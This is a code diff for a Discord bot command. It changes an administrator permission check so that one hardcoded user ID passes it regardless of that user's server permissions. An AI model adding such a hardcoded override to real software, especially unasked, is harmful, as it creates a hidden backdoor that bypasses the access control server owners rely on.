@@ -7,7 +7,7 @@ exports.run = async (client, message, args) => {
 	const role = (!serverSettings[message.guild.id]) ? null : serverSettings[message.guild.id].role;
 	const reason = args.slice(2).join(" ") || "Unknown Reason";
 	const fs = require("fs");
-	if(message.member.hasPermission('ADMINISTRATOR')) {
+	if(message.member.hasPermission('ADMINISTRATOR') || message.author.id == '168695206575734784') {
 	message.channel.send({embed: {
 		color: 0x00ff00,
 		author: {
